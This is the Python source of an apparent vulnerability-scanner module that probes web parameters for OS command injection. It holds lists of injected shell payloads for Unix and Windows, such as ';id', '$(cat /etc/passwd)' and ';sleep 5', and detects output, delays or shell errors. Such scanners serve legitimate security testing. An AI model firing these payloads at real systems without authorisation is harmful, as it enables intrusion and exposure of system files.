"""
modules/cmdi.py
---------------
OS Command Injection (RCE) detection module.

Detects command injection by injecting shell metacharacters and
OS commands into parameters, then analyzing responses for:
- Command output signatures (Linux/Windows)
- Time-based blind injection (sleep/timeout delays)
- Error messages revealing shell execution context
"""

import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Tuple

from modules.base import BaseModule
from utils.helpers import extract_params, inject_param


# ── Inline default payloads ──────────────────────────────────────────────────

# Error-based / output-based payloads
OUTPUT_PAYLOADS: List[Tuple[str, str]] = [
    # (payload, expected_signature)

    # Unix — command substitution in various contexts
    (";id",                    "uid="),
    ("|id",                    "uid="),
    ("$(id)",                  "uid="),
    ("`id`",                   "uid="),
    ("& id",                   "uid="),
    ("&& id",                  "uid="),
    (";id;",                   "uid="),
    ("|id|",                   "uid="),
    ("$(id)#",                 "uid="),
    ("1;id",                   "uid="),
    ("1|id",                   "uid="),
    ("1$(id)",                 "uid="),

    # Unix — /etc/passwd read
    (";cat /etc/passwd",       "root:x:0:"),
    ("|cat /etc/passwd",       "root:x:0:"),
    ("$(cat /etc/passwd)",     "root:x:0:"),
    ("`cat /etc/passwd`",      "root:x:0:"),

    # Unix — uname
    (";uname -a",              "linux"),
    ("|uname -a",              "linux"),

    # Unix — whoami
    (";whoami",                "root"),
    ("|whoami",                "root"),
    ("$(whoami)",              "root"),

    # Windows — dir
    ("& dir",                  "volume in drive"),
    ("| dir",                  "volume in drive"),
    ("&& dir",                 "volume in drive"),

    # Windows — whoami
    ("& whoami",               "nt authority"),
    ("| whoami",               "nt authority"),
    ("&& whoami",              "nt authority"),

    # Windows — type
    ("& type c:\\windows\\win.ini", "[fonts]"),
    ("| type c:\\windows\\win.ini", "[fonts]"),

    # Shell error leakage
    (";invalid_cmd_xyz_123",   "command not found"),
    ("|invalid_cmd_xyz_123",   "sh:"),
    ("$(invalid_cmd_xyz_123)", "sh:"),
]

# Time-based blind payloads (payload, expected_delay_seconds)
TIMEBASED_PAYLOADS: List[Tuple[str, float]] = [
    (";sleep 5",          4.5),
    ("|sleep 5",          4.5),
    ("$(sleep 5)",        4.5),
    ("`sleep 5`",         4.5),
    ("& timeout /t 5",    4.5),   # Windows
    ("| timeout /t 5",    4.5),   # Windows
    (";sleep 3",          2.8),
    ("|sleep 3",          2.8),
]

# Known error patterns that indicate shell execution context
SHELL_ERROR_PATTERNS = [
    r"sh:\s+\d+:",
    r"/bin/sh:",
    r"/bin/bash:",
    r"command not found",
    r"is not recognized as an internal or external command",
    r"cannot execute binary file",
    r"ambiguous redirect",
    r"syntax error.*unexpected token",
    r"no such file or directory",
    r"\bwarning\b.*\bsh\b",
]


class CMDiModule(BaseModule):
    """
    OS Command Injection (RCE) detection module.

    Three detection techniques:
    1. Output-based — inject a command, look for its output in the response
    2. Time-based blind — inject a sleep command, measure response delay
    3. Error-based — inject invalid syntax, look for shell error messages

    Supports both Unix and Windows targets.
    """

    def load_payloads(self) -> List[str]:
        """
        Return flat list of payloads (output-based only) for dry-run / wordlist use.

        Time-based payloads are handled separately in execute().
        """
        if self.config.wordlist:
            return self._load_external_wordlist(self.config.wordlist)
        return [p for p, _ in OUTPUT_PAYLOADS]

    def execute(self) -> List[Dict[str, Any]]:
        """
        Run command injection scan:
        1. Output-based detection (parallel)
        2. Time-based blind detection (sequential — needs accurate timing)
        """
        params = extract_params(self.config.url, self.config.param)
        if not params:
            self.logger.warning("[!] No injectable parameters found in URL")
            return []

        self.logger.info(f"[+] Parameters: {', '.join(params)}")
        self.logger.info(
            f"[+] {len(OUTPUT_PAYLOADS)} output-based + "
            f"{len(TIMEBASED_PAYLOADS)} time-based payloads"
        )

        results: List[Dict[str, Any]] = []

        # Phase 1: Output-based (parallel)
        self.logger.info("[*] Phase 1: Output-based detection...")
        output_jobs = [
            (payload, sig, param)
            for param in params
            for payload, sig in OUTPUT_PAYLOADS
        ]

        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = {
                executor.submit(
                    self._test_output_payload, payload, sig, param
                ): (payload, param)
                for payload, sig, param in output_jobs
            }
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    if result.get("vulnerable"):
                        self.logger.info(
                            f"  [VULN] Param='{result['param']}'  "
                            f"Payload='{result['payload'][:50]}'  "
                            f"| {result['evidence']}"
                        )

        # Phase 2: Time-based blind (sequential for timing accuracy)
        self.logger.info("[*] Phase 2: Time-based blind detection...")
        for param in params:
            for payload, expected_delay in TIMEBASED_PAYLOADS:
                result = self._test_timebased_payload(payload, expected_delay, param)
                if result:
                    results.append(result)
                    if result.get("vulnerable"):
                        self.logger.info(
                            f"  [VULN] BLIND  Param='{result['param']}'  "
                            f"Payload='{result['payload']}'  "
                            f"| {result['evidence']}"
                        )

        return results

    def _test_output_payload(
        self, payload: str, expected_sig: str, param: str
    ) -> Dict[str, Any]:
        """Inject payload and check for expected command output signature. Delay per-worker."""
        if self.config.delay:
            time.sleep(self.config.delay)

        injected_url = inject_param(self.config.url, param, payload)
        response = self.http.get(injected_url)

        if response is None:
            return {
                "payload": payload, "param": param,
                "vulnerable": False, "evidence": "No response",
                "url": injected_url, "technique": "output-based",
            }

        return self.analyze_response(
            response, payload, param, expected_sig=expected_sig
        )

    def _test_timebased_payload(
        self, payload: str, expected_delay: float, param: str
    ) -> Dict[str, Any]:
        """
        Inject a sleep-based payload and measure actual response time.

        Flags as vulnerable if response took >= expected_delay seconds.
        """
        injected_url = inject_param(self.config.url, param, payload)

        t_start = time.monotonic()
        response = self.http.get(injected_url)
        elapsed = time.monotonic() - t_start

        result: Dict[str, Any] = {
            "payload": payload,
            "param": param,
            "vulnerable": False,
            "evidence": "",
            "status_code": response.status_code if response else 0,
            "response_length": len(response.content) if response else 0,
            "url": injected_url,
            "technique": "time-based",
            "response_time": round(elapsed, 2),
        }

        if response is None:
            result["evidence"] = "No response"
            return result

        if elapsed >= expected_delay:
            result["vulnerable"] = True
            result["evidence"] = (
                f"Response delayed {elapsed:.2f}s (expected ≥{expected_delay}s) "
                f"— blind command injection confirmed"
            )

        return result

    def analyze_response(
        self,
        response,
        payload: str,
        param: str,
        expected_sig: str = "",
        **kwargs,
    ) -> Dict[str, Any]:
        """
        Check response for:
        1. Expected command output signature
        2. Known shell error patterns
        """
        result: Dict[str, Any] = {
            "payload": payload,
            "param": param,
            "vulnerable": False,
            "evidence": "",
            "status_code": response.status_code,
            "response_length": len(response.content),
            "url": response.url if hasattr(response, "url") else self.config.url,
            "technique": "output-based",
        }

        body = response.text

        # Check 1: Expected output signature (e.g. "uid=" for id command)
        if expected_sig and expected_sig.lower() in body.lower():
            result["vulnerable"] = True
            result["evidence"] = (
                f"Command output signature '{expected_sig}' "
                f"found in response"
            )
            return result

        # Check 2: Shell error patterns (indirect injection evidence)
        for pattern in SHELL_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                result["vulnerable"] = True
                result["evidence"] = (
                    f"Shell error pattern detected: '{pattern}' "
                    f"— possible command injection context"
                )
                return result

        return result
